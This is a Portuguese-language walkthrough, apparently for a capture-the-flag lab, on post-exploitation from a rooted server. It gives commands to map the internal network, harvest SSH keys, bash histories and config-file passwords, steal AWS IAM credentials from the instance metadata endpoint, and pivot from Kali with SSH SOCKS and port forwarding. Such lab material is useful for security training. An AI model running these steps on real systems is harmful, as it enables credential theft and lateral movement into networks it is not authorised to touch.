# O que fazer com root na Parte 1 para iniciar a Parte 2

A dica da Parte 2 diz que os atacantes (LightBringers) **não pararam no acesso inicial**: podem ter **extraído informações do servidor comprometido** e usado isso como **ponte para a infraestrutura interna**. Ou seja: o seu servidor (Rede Blogo) é a **ponta de lança** para a rede interna.

Com **root** nesse servidor você deve: **(1)** mapear a rede interna, **(2)** colher credenciais e artefatos que permitam pivô para outros hosts/serviços, **(3)** anotar tudo para atacar a Parte 2 a partir da sua Kali (usando esse host como pivô).

---

## 1. Mapear a rede interna (a “ponte”)

Rodar **como root** no servidor comprometido (ex.: depois de `su 0xdtc`):

```bash
# Sua interface e IP na rede interna
ip addr
ip route

# Tabela de rotas (subredes internas)
cat /etc/hosts
route -n

# Quem mais está na rede (se tiver ip neigh / arp)
ip neigh
arp -a 2>/dev/null
```

Anotar:
- **IP interno** do servidor (ex.: 10.0.x.x).
- **Subredes** (ex.: 10.0.0.0/16) e **gateway**.
- Outros IPs/hostnames em `/etc/hosts` ou que apareçam em logs/conexões.

---

## 2. Descobrir outros hosts e serviços (ruído na rede)

```bash
# Conexões ativas (outros IPs internos)
ss -tunap
netstat -tunap 2>/dev/null

# Processos com conexões de rede
ps aux | grep -E 'ssh|mysql|nginx|curl|wget'

# Logs que citem IPs ou hostnames internos
grep -r "10\.0\." /var/log/ 2>/dev/null | head -50
grep -r "192\.168\." /var/log/ 2>/dev/null | head -20
cat /var/log/syslog 2>/dev/null | tail -100
```

Se tiver ferramentas (ou puder enviar binários):

```bash
# Varredura interna (ajustar interface e rede)
# Ex.: for i in $(seq 1 254); do (ping -c1 -W1 10.0.0.$i &); done
# Ou, se tiver nmap/nc: nmap -sn 10.0.0.0/24
```

Anotar: **IPs internos** que apareçam (servidores, DBs, outros serviços).

---

## 3. Credenciais e artefatos (o que “extraíram” para usar de ponte)

### 3.1 Chaves SSH e authorized_keys

```bash
cat /root/.ssh/authorized_keys 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null
cat /home/*/.ssh/authorized_keys 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null
```

Servem para: **pivô SSH** para outros servidores internos (se houver chaves ou entradas que citem outros hosts).

### 3.2 Histórico e arquivos de usuários

```bash
cat /root/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
ls -la /root/ /home/
```

Procurar: IPs, hostnames, senhas em claro, comandos `ssh`, `mysql`, `curl` para hosts internos.

### 3.3 Configurações de serviços (MySQL, Apache, Nginx, etc.)

```bash
# MySQL: pode ter usuário/senha e host remoto
cat /var/www/blogo/config/*.php 2>/dev/null
grep -r "password\|host\|mysql" /var/www/blogo/ 2>/dev/null

# Configs gerais
grep -r "10\.0\.\|192\.168\.\|password\|passwd" /etc/ 2>/dev/null | grep -v Binary
```

Anotar: **usuários/senhas** e **hosts internos** (DB, APIs, etc.).

### 3.4 AWS (se o host for EC2)

```bash
# Credenciais temporárias da instância (role IAM)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
```

Se retornar JSON com `AccessKeyId`, `SecretAccessKey`, `Token`: usar na Parte 2 para **enumerar S3, EC2, Secrets Manager, SSM** (conforme o RESUMO_DESCOBERTAS da Parte 2).

### 3.5 Cron, scripts e binários suspeitos

```bash
crontab -l 2>/dev/null
ls -la /etc/cron.* 2>/dev/null
cat /etc/crontab 2>/dev/null
grep -r "curl\|wget\|ssh\|mysql\|10\.0\.\|192\.168" /etc/cron* 2>/dev/null
find /opt /usr/local -type f -name "*.sh" 2>/dev/null
```

Podem revelar: **outros servidores**, scripts de backup, chamadas a APIs internas.

---

## 4. Resumir para a Parte 2

Montar um pequeno “dossiê” com:

| Item | Exemplo |
|------|--------|
| IP interno do servidor Blogo | 10.0.55.149 |
| Subrede interna | 10.0.0.0/16 |
| Outros IPs/hostnames descobertos | 10.0.99.169, projects-blogo.sy |
| Credenciais (DB, SSH, AWS) | usuário/senha ou chaves |
| Portas/serviços internos | 22, 80, 3306, etc. |

Com isso você:
- Sabe **por onde atacar** a rede interna (IPs e redes).
- Tem **credenciais** para reutilizar (SSH, MySQL, AWS).
- Pode configurar **pivô** da sua Kali para a rede interna (ex.: SSH dinâmico, chisel, proxychains) usando esse host como ponte.

---

## 5. Pivô a partir da sua Kali (depois)

Quando tiver um shell estável como root no servidor da Parte 1:

- **Túnel SSH (SOCKS):** na Kali:  
  `ssh -D 1080 -N 0xdtc@<IP_PUBLICO_DO_SERVIDOR>`  
  (usando a senha vazia do 0xdtc ou chave). No browser/ferramentas: proxy SOCKS5 = 127.0.0.1:1080.
- **Port forwarding:**  
  `ssh -L 2222:10.0.99.169:22 0xdtc@<IP_PUBLICO>`  
  Depois: `ssh -p 2222 usuario@127.0.0.1` para acessar o host interno.
- Se tiver **credenciais AWS** do metadata: usar na Kali (ou em outro host) para rodar `aws ec2 describe-instances`, `aws s3 ls`, etc., conforme o RESUMO_DESCOBERTAS da Parte 2.

---

## Checklist rápido (rodar como root na Parte 1)

- [ ] `ip addr` e `ip route` — anotar IP interno e rede
- [ ] `cat /etc/hosts` — hostnames internos
- [ ] `ss -tunap` / `netstat -tunap` — conexões e IPs internos
- [ ] `cat /root/.bash_history` e `/home/*/.bash_history`
- [ ] `cat /root/.ssh/authorized_keys` e `ls /root/.ssh/`
- [ ] Configs do blog (MySQL, hosts) em `/var/www/blogo/`
- [ ] `curl` ao metadata AWS (169.254.169.254) se for EC2
- [ ] Logs em `/var/log/` com grep por 10.0. ou 192.168.
- [ ] Cron e scripts em `/etc/cron*`, `/opt`, `/usr/local`
- [ ] Montar o “dossiê” (IPs, credenciais, serviços) e usar como base da Parte 2

A “ponte” para a Parte 2 é esse servidor + a rede e credenciais que você descobrir com root nele.
